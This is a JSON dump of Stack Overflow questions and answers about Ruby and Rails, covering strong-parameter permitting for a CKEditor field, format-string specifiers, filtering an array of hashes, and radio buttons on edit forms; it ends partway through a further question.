[{"tags": ["ruby-on-rails", "ruby", "ckeditor", "simple-form"], "comments": [{"owner": {"reputation": 3272, "user_id": 2389628, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/A4nuI.jpg?s=128&g=1", "display_name": "smallbutton", "link": "https://stackoverflow.com/users/2389628/smallbutton"}, "edited": false, "score": 0, "creation_date": 1536130638, "post_id": 52087441, "comment_id": 91307830, "body": "Could you post the controller as well? It might be that you just need to permit the parameter."}, {"owner": {"reputation": 947, "user_id": 7372897, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/fef45f6e174d50b0fb51c2069653b3c6?s=128&d=identicon&r=PG&f=1", "display_name": "Jake", "link": "https://stackoverflow.com/users/7372897/jake"}, "reply_to_user": {"reputation": 3272, "user_id": 2389628, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/A4nuI.jpg?s=128&g=1", "display_name": "smallbutton", "link": "https://stackoverflow.com/users/2389628/smallbutton"}, "edited": false, "score": 0, "creation_date": 1536156855, "post_id": 52087441, "comment_id": 91324260, "body": "@smallbutton.com This is one of those facepalm moments... I spent so long trying to figure this out and here it was, tucked away in the params. Please answer this question, I&#39;d love to reward you for this!"}], "answers": [{"tags": [], "owner": {"reputation": 3272, "user_id": 2389628, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/A4nuI.jpg?s=128&g=1", "display_name": "smallbutton", "link": "https://stackoverflow.com/users/2389628/smallbutton"}, "is_accepted": true, "score": 0, "last_activity_date": 1536176404, "creation_date": 1536176404, "answer_id": 52192358, "question_id": 52087441, "link": "https://stackoverflow.com/questions/52087441/second-instance-of-ckeditor-not-saving-to-db-ruby-on-rails/52192358#52192358", "title": "Second instance of CKEditor not saving to db | Ruby on Rails", "body": "<p>You need to permit the <code>pack_contents</code> parameter in the controller, in oder for it to be saved in the model. </p>\n"}], "owner": {"reputation": 947, "user_id": 7372897, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/fef45f6e174d50b0fb51c2069653b3c6?s=128&d=identicon&r=PG&f=1", "display_name": "Jake", "link": "https://stackoverflow.com/users/7372897/jake"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 76, "favorite_count": 0, "accepted_answer_id": 52192358, "answer_count": 1, "score": 0, "last_activity_date": 1536183019, "creation_date": 1535586241, "last_edit_date": 1536183019, "question_id": 52087441, "link": "https://stackoverflow.com/questions/52087441/second-instance-of-ckeditor-not-saving-to-db-ruby-on-rails", "title": "Second instance of CKEditor not saving to db | Ruby on Rails", "body": "<p>I have a form that I'm using for creating/updating products known as a \"pack\" in my rails application. The first instance of CKEditor is saving to the db and working in the show view but the second isn't.</p>\n\n<p>I've tried renaming the db column name to something else in case it was a conflicting name, but that didn't seem to change anything either.</p>\n\n<p><strong>packs/new.html.erb:</strong></p>\n\n<pre><code>&lt;div class=\"wellington center news-form\"&gt;\n  &lt;%= simple_form_for Pack.new do |f| %&gt;\n  &lt;%= render 'shared/error_messages', object: f.object %&gt;\n      &lt;%= f.input :title, class: \"form-control center\" %&gt; &lt;!-- \"Name of pack or soundtrack\" --&gt;\n      &lt;%= f.input :description, :as =&gt; :ckeditor, input_html: {:ckeditor =&gt; {:toolbar =&gt; 'FULL'}}, class: \"form-control left\" %&gt; &lt;!-- \"Description of pack\" --&gt;\n      &lt;%= f.input :pack_contents, :as =&gt; :ckeditor, input_html: {:ckeditor =&gt; {:toolbar =&gt; 'FULL'}}, class: \"form-control left\" %&gt; &lt;!-- \"Use a &lt;ul&gt; to list included items\" --&gt;\n      &lt;%= f.input :pack_type, class: \"form-control center\" %&gt; &lt;!-- \"Category of pack/product (Sound library, Vocal pack, soundtrack category, plugin preset pack.)\" --&gt;\n      &lt;%= f.input :category_id, prompt: \"Select Category\", collection: [ \"sample-pack\", \"vocal-pack\", \"preset-pack\", \"track-pixel\", \"track-indie\", \"track-orchestral\"], input_html: { class: \"form-control center\" } %&gt; &lt;!-- What product is this? --&gt;\n      &lt;%= f.input :price, class: \"form-control center\" %&gt; &lt;!-- \"Product price (Just the #)\" --&gt;\n      &lt;%= f.input :audio_embed, class: \"form-control center\" %&gt; &lt;!-- \"Soundcloud embed link inside the iframe src\" --&gt;\n      &lt;%= f.input :art_link, prompt: \"ENTER N/A IF STRACK\", class: \"form-control center\" %&gt; &lt;!-- \"Cover art for product (file name)\" --&gt;\n      &lt;%= f.input :download_url, class: \"form-control center\" %&gt; &lt;!-- Download Source --&gt;\n    &lt;%= f.submit \"Add product to grid\", class: \"btn btn-success btn-block\" %&gt;\n  &lt;% end %&gt;\n    &lt;%= link_to \"Cancel\", packs_path, class: \"btn btn-danger top-drop\" %&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p><strong>packs/show.html.erb:</strong></p>\n\n<pre><code>&lt;div class=\"description\"&gt;&lt;%= raw @pack.description %&gt;&lt;/div&gt;\n&lt;div class=\"pack-contents\"&gt;&lt;%= raw @pack.pack_contents %&gt;&lt;/div&gt;\n</code></pre>\n\n<p>Thanks in advance, I appreciate the help!</p>\n\n<p><strong>Update:</strong></p>\n\n<p><strong>packs_controller:</strong></p>\n\n<pre><code>private\n\n  def pack_params\n    params.require(:pack).permit(:art_link, :title, :description, :price, :pack_type, :pack_class, :audio_embed, :category_id, :download_url)\n  end\n</code></pre>\n"}, {"tags": ["ruby", "string", "formatting", "string-formatting", "string-interpolation"], "answers": [{"tags": [], "owner": {"reputation": 394580, "user_id": 479863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ArUCE.jpg?s=128&g=1", "display_name": "mu is too short", "link": "https://stackoverflow.com/users/479863/mu-is-too-short"}, "is_accepted": true, "score": 2, "last_activity_date": 1535581901, "creation_date": 1535581901, "answer_id": 52086957, "question_id": 52086595, "link": "https://stackoverflow.com/questions/52086595/ruby-format-string-with-variable-inside-quotes/52086957#52086957", "title": "Ruby format string with variable inside quotes", "body": "<p>From the <a href=\"http://ruby-doc.org/core/Kernel.html#method-i-format\" rel=\"nofollow noreferrer\">fine manual</a>:</p>\n\n<blockquote>\n  <p><strong>format(format_string [, arguments...] ) \u2192 string</strong><br>\n  [...]<br>\n  For more complex formatting, Ruby supports a reference by name. <code>%&lt;name&gt;s</code> style uses format style, but <code>%{name}</code> style doesn't.</p>\n</blockquote>\n\n<p>The documentation isn't as clear as it could be but when you use the <code>%&lt;...&gt;</code> form, it is expecting to see <code>%&lt;name&gt;s</code> where <code>name</code> is the hash key and <code>s</code> is the format type: <code>s</code> for string, <code>d</code> for number, ... If you say:</p>\n\n<pre><code>%&lt;additional_classes&gt;'\n</code></pre>\n\n<p>then <code>format</code> will try to interpret <code>'</code> as a type when there is no such type specifier so you get an <code>ArgumentError</code> because the format string is malformed.</p>\n\n<p>You probably want to use the <code>%{...}</code> form instead:</p>\n\n<pre><code>template_string = \"class='btn submit-button %{additional_classes}'\"\n#--------------------------------------------^------------------^\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "is_accepted": false, "score": 2, "last_activity_date": 1535582146, "creation_date": 1535582146, "answer_id": 52086990, "question_id": 52086595, "link": "https://stackoverflow.com/questions/52086595/ruby-format-string-with-variable-inside-quotes/52086990#52086990", "title": "Ruby format string with variable inside quotes", "body": "<p>Your format string is missing the <a href=\"http://ruby-doc.org/core/Kernel.html#method-i-format\" rel=\"nofollow noreferrer\">field type specifier</a>. The field type specifier is mandatory in a format string.</p>\n\n<p>It is not clear to me why the first example does not raise an error, since the mandatory field type specifier is missing. It could be a bug, or I am completely misreading the documentation.</p>\n\n<p>However, it is not clear to me why you consider this example to work:</p>\n\n<pre><code>template_string = \"class=btn submit-button %&lt;additional_classes&gt;\"\nformat(template_string, additional_classes: 'some-class')\n#=&gt; 'class=btn submit-button %'\n#                            \u2191\n</code></pre>\n\n<p>As you can see, the <code>%</code> is not interpreted as the part of a format string but as a literal <code>%</code>. I would consider this a bug, it should raise an error, just like the second example does.</p>\n\n<p>In the second example, you can clearly see the problem:</p>\n\n<pre><code>ArgumentError: malformed format string - %'\n                                          \u2191\n</code></pre>\n\n<p>Since a format string must have a field type specifier, and the only character after the <code>%</code> (except the field name) is <code>'</code>, this is interpreted as the field type specifier. And since <code>'</code> is not a legal field type, <code>format</code> raises an error in which it explicitly tells you that it interpreted the <code>'</code> as part of the format string.</p>\n\n<p>Since you want to format strings, you should use the <code>s</code> (string) field type specifier:</p>\n\n<pre><code>template_string = \"class=btn 'submit-button %&lt;additional_classes&gt;s'\"\n#                                                                \u2191\n\nformat(template_string, additional_classes: 'some-class')\n#=&gt; \"class=btn 'submit-button some-class'\"\n#                             \u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\n</code></pre>\n\n<p>Alternatively, you can use the <code>%{}</code> form:</p>\n\n<pre><code>template_string = \"class=btn 'submit-button %{additional_classes}'\"\n#                                            \u2191                  \u2191\n\nformat(template_string, additional_classes: 'some-class')\n#=&gt; \"class=btn 'submit-button some-class'\"\n#                             \u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\n</code></pre>\n"}], "owner": {"reputation": 1446, "user_id": 805141, "user_type": "registered", "accept_rate": 41, "profile_image": "https://www.gravatar.com/avatar/41d3035f75a3f33195e7037fb079cea5?s=128&d=identicon&r=PG", "display_name": "Daniel", "link": "https://stackoverflow.com/users/805141/daniel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 481, "favorite_count": 0, "accepted_answer_id": 52086957, "answer_count": 2, "score": 0, "last_activity_date": 1535582146, "creation_date": 1535579664, "last_edit_date": 1535580771, "question_id": 52086595, "link": "https://stackoverflow.com/questions/52086595/ruby-format-string-with-variable-inside-quotes", "title": "Ruby format string with variable inside quotes", "body": "<p>If I do</p>\n\n<pre><code>template_string = \"class=btn submit-button %&lt;additional_classes&gt;\"\nformat(template_string, additional_classes: 'some-class')\n</code></pre>\n\n<p>it works. However, if I do</p>\n\n<pre><code>template_string = \"class='btn submit-button %&lt;additional_classes&gt;'\"\nformat(template_string, additional_classes: 'some-class')\n</code></pre>\n\n<p>it fails, giving</p>\n\n<pre><code>ArgumentError:\n  malformed format string - %'\n</code></pre>\n\n<p>(Notice the quotation marks surrounding the classes in the second template_string - this is the only difference between the two blocks of Ruby code). How do I make it work? In other words, how do I produce the following?</p>\n\n<blockquote>\n  <p>class='btn submit-button some-class'</p>\n</blockquote>\n\n<p>I don't believe that I can just use interpolation, because sometimes I need to pass in other variables. In other words, I can't do</p>\n\n<pre><code>additional_classes = 'some-class'\n\"class='btn submit-button #{additional_classes}'\"\n</code></pre>\n\n<p>because sometimes I want to reuse the same string \"template\" but pass in other variables, to produce strings such as the following:</p>\n\n<blockquote>\n  <p>class='btn submit-button some-other-class'</p>\n</blockquote>\n\n<p>or</p>\n\n<blockquote>\n  <p>class='btn submit-button some-third-class'</p>\n</blockquote>\n"}, {"tags": ["arrays", "ruby", "hash"], "comments": [{"owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 2, "creation_date": 1535582587, "post_id": 52086434, "comment_id": 91124308, "body": "By the way, there are tens of thousands of questions on Stack Overflow about &quot;how do I deal with this array of hashes of strings to strings&quot; or something similar, and the answer is always the same: Ruby is an object-oriented language, not an array-of-hashes-from-strings-to-strings-oriented language. Re-design your data model so that you don&#39;t have those complex structures in the first place, and then you don&#39;t need to deal with them."}, {"owner": {"reputation": 22592, "user_id": 147586, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e4f5d494ebdc9e7cce1aecf3ce3e8bc1?s=128&d=identicon&r=PG", "display_name": "Shpigford", "link": "https://stackoverflow.com/users/147586/shpigford"}, "reply_to_user": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 0, "creation_date": 1535595452, "post_id": 52086434, "comment_id": 91126973, "body": "@J&#246;rgWMittag Agreed. This insane data model is from a third-party API that I have no control over. I&#39;d love to not have to deal with this. :)"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1535609521, "post_id": 52086434, "comment_id": 91130294, "body": "Then don&#39;t deal with it. Wrap it into your own data model."}, {"owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1535616500, "post_id": 52086434, "comment_id": 91134062, "body": "Here&#39;s a couple of examples of what @TomLord is talking about: <a href=\"https://stackoverflow.com/a/43033758/2988\">stackoverflow.com/a/43033758/2988</a>, <a href=\"https://stackoverflow.com/a/45847433/2988\">stackoverflow.com/a/45847433/2988</a>, <a href=\"https://stackoverflow.com/a/28051415/2988\">stackoverflow.com/a/28051415/2988</a>, <a href=\"https://stackoverflow.com/a/20612726/2988\">stackoverflow.com/a/20612726/2988</a>, <a href=\"https://stackoverflow.com/a/32502358/2988\">stackoverflow.com/a/32502358/2988</a>, <a href=\"https://stackoverflow.com/a/33125872/2988\">stackoverflow.com/a/33125872/2988</a>, <a href=\"https://stackoverflow.com/a/31388268/2988\">stackoverflow.com/a/31388268/2988</a>."}], "answers": [{"tags": [], "owner": {"reputation": 3119, "user_id": 4842949, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-0agpj31wtZ8/AAAAAAAAAAI/AAAAAAAAAAA/mSolbNN-zIY/photo.jpg?sz=128", "display_name": "Joseph Cho", "link": "https://stackoverflow.com/users/4842949/joseph-cho"}, "is_accepted": true, "score": 2, "last_activity_date": 1535581797, "last_edit_date": 1535581797, "creation_date": 1535579936, "answer_id": 52086632, "question_id": 52086434, "link": "https://stackoverflow.com/questions/52086434/delete-item-from-ruby-array-of-hashes-if-item-matches-array-of-strings/52086632#52086632", "title": "Delete item from Ruby array of hashes if item matches array of strings", "body": "<p>It looks like your <code>hash_list</code> is missing some closing brackets. I've added them below. Try running this in irb:</p>\n\n<pre><code>playlist_track_names = [\"I Might\", \"Me &amp; You\", \"Day 1\", \"I Got You (feat. Nana Rogues)\", \"Feels So Good (feat. Anna of the North)\", \"306\", \"Location Unknown (feat. Georgia)\", \"Crying Over You (feat. BEKA)\", \"Shrink\", \"I Just Wanna Go Back\", \"Sometimes\", \"Forget Me Not\"] \n\nhash_list = [\n  {\"id\"=&gt;\"1426036284\", \"type\"=&gt;\"songs\", \"attributes\"=&gt;{\"name\"=&gt;\"I Might\", \"albumName\"=&gt;\"Love Me / Love Me Not\" } },\n  {\"id\"=&gt;\"1426036285\", \"type\"=&gt;\"songs\", \"attributes\"=&gt;{\"name\"=&gt;\"Feels So Good (feat. Anna of the North)\", \"albumName\"=&gt;\"Love Me / Love Me Not\" } },\n  {\"id\"=&gt;\"1426036286\", \"type\"=&gt;\"songs\", \"attributes\"=&gt;{\"name\"=&gt;\"Forget Me Not\", \"albumName\"=&gt;\"Love Me / Love Me Not\" } },\n  {\"id\"=&gt;\"1426036287\", \"type\"=&gt;\"songs\", \"attributes\"=&gt;{\"name\"=&gt;\"Some Other Name\", \"albumName\"=&gt;\"Love Me / Love Me Not\" } }\n]\n\nhash_list.delete_if { |i| playlist_track_names.include? i[\"attributes\"][\"name\"] }\nputs hash_list\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 3119, "user_id": 4842949, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-0agpj31wtZ8/AAAAAAAAAAI/AAAAAAAAAAA/mSolbNN-zIY/photo.jpg?sz=128", "display_name": "Joseph Cho", "link": "https://stackoverflow.com/users/4842949/joseph-cho"}, "edited": false, "score": 1, "creation_date": 1535640661, "post_id": 52087002, "comment_id": 91150502, "body": "I never knew about set. Thanks for the knowledge"}], "tags": [], "owner": {"reputation": 126343, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": false, "score": 0, "last_activity_date": 1535582260, "creation_date": 1535582260, "answer_id": 52087002, "question_id": 52086434, "link": "https://stackoverflow.com/questions/52086434/delete-item-from-ruby-array-of-hashes-if-item-matches-array-of-strings/52087002#52087002", "title": "Delete item from Ruby array of hashes if item matches array of strings", "body": "<p>You can use <a href=\"https://ruby-doc.org/core-2.5.1/Array.html#method-i-delete_if\" rel=\"nofollow noreferrer\"><code>Array#delete_if</code></a> to delete any entries which match a block. In the block use <a href=\"https://ruby-doc.org/core-2.5.1/Array.html#method-i-include-3F\" rel=\"nofollow noreferrer\"><code>Array#include?</code></a> to check if the track name is in the list.</p>\n\n<pre><code>tracks.delete_if { |track|\n  playlist_track_names.include? track[\"attributes\"][\"name\"]\n}\n</code></pre>\n\n<p>Note that because <code>playlist_track_names.include?</code> has to search through <code>playlist_track_names</code> one by one this will get slower as <code>playlist_track_names</code> gets larger. You can avoid this by using a <a href=\"https://ruby-doc.org/stdlib/libdoc/set/rdoc/Set.html\" rel=\"nofollow noreferrer\">Set</a>.</p>\n\n<pre><code>require 'set'\n\nplaylist_track_names = [\"I Might\", \"Me &amp; You\", ...].to_set\n</code></pre>\n\n<p>A Set is like a Hash with just keys, no values. They're an <em>unordered</em> collection of <em>unique</em> values which are very fast to lookup. <code>playlist_track_names.include?</code> on a Set will perform the same no matter how large <code>playlist_track_names</code> gets.</p>\n"}], "owner": {"reputation": 22592, "user_id": 147586, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e4f5d494ebdc9e7cce1aecf3ce3e8bc1?s=128&d=identicon&r=PG", "display_name": "Shpigford", "link": "https://stackoverflow.com/users/147586/shpigford"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 124, "favorite_count": 0, "accepted_answer_id": 52086632, "answer_count": 2, "score": 1, "last_activity_date": 1535582260, "creation_date": 1535578759, "question_id": 52086434, "link": "https://stackoverflow.com/questions/52086434/delete-item-from-ruby-array-of-hashes-if-item-matches-array-of-strings", "title": "Delete item from Ruby array of hashes if item matches array of strings", "body": "<p>I have a list of strings in an array like so...</p>\n\n<pre><code>playlist_track_names = [\"I Might\", \"Me &amp; You\", \"Day 1\", \"I Got You (feat. Nana Rogues)\", \"Feels So Good (feat. Anna of the North)\", \"306\", \"Location Unknown (feat. Georgia)\", \"Crying Over You (feat. BEKA)\", \"Shrink\", \"I Just Wanna Go Back\", \"Sometimes\", \"Forget Me Not\"] \n</code></pre>\n\n<p>Then I have an array of hashes like so...</p>\n\n<pre><code>[\n  {\"id\"=&gt;\"1426036284\", \"type\"=&gt;\"songs\", \"attributes\"=&gt;{\"name\"=&gt;\"I Might\", \"albumName\"=&gt;\"Love Me / Love Me Not\" },\n  {\"id\"=&gt;\"1426036285\", \"type\"=&gt;\"songs\", \"attributes\"=&gt;{\"name\"=&gt;\"Feels So Good (feat. Anna of the North)\", \"albumName\"=&gt;\"Love Me / Love Me Not\" },\n  {\"id\"=&gt;\"1426036286\", \"type\"=&gt;\"songs\", \"attributes\"=&gt;{\"name\"=&gt;\"Forget Me Not\", \"albumName\"=&gt;\"Love Me / Love Me Not\" },\n  {\"id\"=&gt;\"1426036287\", \"type\"=&gt;\"songs\", \"attributes\"=&gt;{\"name\"=&gt;\"Some Other Name\", \"albumName\"=&gt;\"Love Me / Love Me Not\" }\n]\n</code></pre>\n\n<p>What I want to do is remove any item from the array of hashes where <code>attributes['name']</code> matches any of the names in the <code>playlist_track_names</code> array.</p>\n\n<p>How would I do that?</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "answers": [{"comments": [{"owner": {"reputation": 179, "user_id": 9534222, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AfySY.jpg?s=128&g=1", "display_name": "Felipe Marcon", "link": "https://stackoverflow.com/users/9534222/felipe-marcon"}, "edited": false, "score": 0, "creation_date": 1535629849, "post_id": 52086461, "comment_id": 91142771, "body": "Thanks @bkimble. This should work in specific Rails version? I tried but a receive the erro &quot;undefined method `radio_button_tag&#39; for&quot;. What it can be? I use Rails 4.1.5"}, {"owner": {"reputation": 778, "user_id": 2125795, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7EreQ.jpg?s=128&g=1", "display_name": "Billy Kimble", "link": "https://stackoverflow.com/users/2125795/billy-kimble"}, "reply_to_user": {"reputation": 179, "user_id": 9534222, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AfySY.jpg?s=128&g=1", "display_name": "Felipe Marcon", "link": "https://stackoverflow.com/users/9534222/felipe-marcon"}, "edited": false, "score": 0, "creation_date": 1535637257, "post_id": 52086461, "comment_id": 91148038, "body": "Sorry I had a typo in the original post - it should be f.radio_button . I updated my answer!"}, {"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 1, "creation_date": 1535651995, "post_id": 52086461, "comment_id": 91156702, "body": "Your first paragraph (<code>#update</code>/<code>#update_column</code>) isn&#39;t exactly correct. Using <code>#update</code> is preferred most of the time since <code>#update_column</code> updates the attribute directly in the database. Skipping Rails validations and callbacks. See the <a href=\"https://api.rubyonrails.org/classes/ActiveRecord/Persistence.html#method-i-update_columns\" rel=\"nofollow noreferrer\"><code>#update_columns</code></a> documentation."}, {"owner": {"reputation": 778, "user_id": 2125795, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7EreQ.jpg?s=128&g=1", "display_name": "Billy Kimble", "link": "https://stackoverflow.com/users/2125795/billy-kimble"}, "edited": false, "score": 0, "creation_date": 1535652969, "post_id": 52086461, "comment_id": 91157138, "body": "You&#39;re right . I was looking at AR::Base.update which expects an ID and the hash.. Fixing my answer."}], "tags": [], "owner": {"reputation": 778, "user_id": 2125795, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7EreQ.jpg?s=128&g=1", "display_name": "Billy Kimble", "link": "https://stackoverflow.com/users/2125795/billy-kimble"}, "is_accepted": true, "score": 1, "last_activity_date": 1535652993, "last_edit_date": 1535652993, "creation_date": 1535578947, "answer_id": 52086461, "question_id": 52086214, "link": "https://stackoverflow.com/questions/52086214/ruby-on-rails-preserve-radio-button-selected-on-edit-view/52086461#52086461", "title": "Ruby on Rails - Preserve radio button selected on edit view", "body": "<p>You shouldn't need two separate forms for this. You can do it with just one, and by using form_for (<a href=\"https://api.rubyonrails.org/v5.1/classes/ActionView/Helpers/FormHelper.html\" rel=\"nofollow noreferrer\">https://api.rubyonrails.org/v5.1/classes/ActionView/Helpers/FormHelper.html</a>) instead of form_tag. When you have an a model to operate on, you should use form_for. form_tag is for forms without backing models. In the same vein, radio_button_tag is when you don't have a backing model, and radio_button (<a href=\"https://apidock.com/rails/ActionView/Helpers/FormHelper/radio_button\" rel=\"nofollow noreferrer\">https://apidock.com/rails/ActionView/Helpers/FormHelper/radio_button</a>) is when you do. Since you have a model, you should go the form_tag route. I suggest changing this around to be(assuming you have a 'work' attribute on your GuideDogForm model):</p>\n\n<p>edit.html.erb (you can copy and paste this in to new.html.erb and it should work like you expect for new records)</p>\n\n<pre><code>&lt;%= form_for @guidedoguser do do |f| %&gt;\n  &lt;%= f.radio_button :work %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>controller:</p>\n\n<pre><code>class GuideDogFormsController &lt; ApplicationController\n  def new\n    @guidedoguser = GuideDogForm.new\n  end\n\n  def create\n    @guidedoguser = GuideDogForm.new(guide_dog_params)\n    if @guidedoguser.save\n      GuideDogMailer.delay_for(10.seconds, retry: true).create(@guidedoguser)\n      render nothing: true, status: 200\n    else\n      render nothing: true, status: 400\n    end\n  end\n\n  def edit\n    @guidedoguser = GuideDogForm.where(rg: params[:rg]).first\n  end\n\n  def update\n    @guidedoguser = GuideDogForm.where(rg: params[:rg]).first\n    if @guidedoguser.update_attributes(guide_dog_params)\n      redirect_to guide_dog_form_path(@guidedoguser)\n    else \n      render 'edit'\n    end\n  end\n\n  private\n\n  def guide_dog_params\n    # note if you have more fields you want to persist in your model from your form, you will\n    # need to add them here after :work\n    params.require(:guide_dog_form).permit(:work)\n  end\nend\n</code></pre>\n"}], "owner": {"reputation": 179, "user_id": 9534222, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AfySY.jpg?s=128&g=1", "display_name": "Felipe Marcon", "link": "https://stackoverflow.com/users/9534222/felipe-marcon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 372, "favorite_count": 0, "accepted_answer_id": 52086461, "answer_count": 1, "score": 0, "last_activity_date": 1535652993, "creation_date": 1535577604, "question_id": 52086214, "link": "https://stackoverflow.com/questions/52086214/ruby-on-rails-preserve-radio-button-selected-on-edit-view", "title": "Ruby on Rails - Preserve radio button selected on edit view", "body": "<p>I have a form to create and a form to edit some information on my site. In the creation form, the user can select some radio buttons, such as \"Yes\" or \"No\", and in my database these fields are <code>Boolean</code> (true or false).</p>\n\n<p>In my form edition, how can I preserve the selected radio button? Currently, if the user selects any of the options, the edit view does not preserve this information and shows only the blank radio buttons.</p>\n\n<p>edit.html.erb</p>\n\n<pre><code>&lt;%= form_tag guide_dog_form_path(@guidedoguser), method: \"put\" do %&gt;\n  &lt;%= radio_button_tag :work, @guidedoguser.work %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>controller.rb</p>\n\n<pre><code>class GuideDogFormsController &lt; ApplicationController\n\n  def create\n    @contact = GuideDogForm.new(params[:contact])\n    if @contact.save\n      GuideDogMailer.delay_for(10.seconds, retry: true).create(@contact)\n      render nothing: true, status: 200\n    else\n      render nothing: true, status: 400\n    end\n  end\n\n  def edit\n    @guidedoguser = GuideDogForm.where(rg: params[:rg]).first\n  end\n\n  def update\n    @guidedoguser = GuideDogForm.where(rg: params[:rg]).first\n    if @guidedoguser.update(work: params[:work])\n      redirect_to guide_dog_form_path(@guidedoguser)\n    else \n      render 'edit'\n    end\n  end\n\nend\n</code></pre>\n\n<p>How can I show the two options in radio buttons (Yes or No) and preserve the options chosen on create?</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 2125, "user_id": 1446543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/934816c610f53abdab5f26510478bc24?s=128&d=identicon&r=PG", "display_name": "ForeverZer0", "link": "https://stackoverflow.com/users/1446543/foreverzer0"}, "edited": false, "score": 0, "creation_date": 1535594634, "post_id": 52085729, "comment_id": 91126782, "body": "There is no loop in your example, it is just a block.Why can&#39;t you just call it and see the result?"}, {"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 0, "creation_date": 1535609431, "post_id": 52085729, "comment_id": 91130245, "body": "&#39;do&#39; does not return anything . The method <code>each</code> does."}], "answers": [{"comments": [{"owner": {"reputation": 1777, "user_id": 3353157, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6168a2c2f5e3582addf6d9d70ce13749?s=128&d=identicon&r=PG", "display_name": "Peter Camilleri", "link": "https://stackoverflow.com/users/3353157/peter-camilleri"}, "edited": false, "score": 0, "creation_date": 1535589685, "post_id": 52085987, "comment_id": 91125848, "body": "There is no cats method. In this example, cats is the argument of the get_non_red_cats method. Most likely it is an array of cats, but the question is vague on that point. Moreover, if the desire is to get cats that are not red consider instead cats.select { |cat| !is_cat_red?(cat) }"}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "reply_to_user": {"reputation": 1777, "user_id": 3353157, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6168a2c2f5e3582addf6d9d70ce13749?s=128&d=identicon&r=PG", "display_name": "Peter Camilleri", "link": "https://stackoverflow.com/users/3353157/peter-camilleri"}, "edited": false, "score": 0, 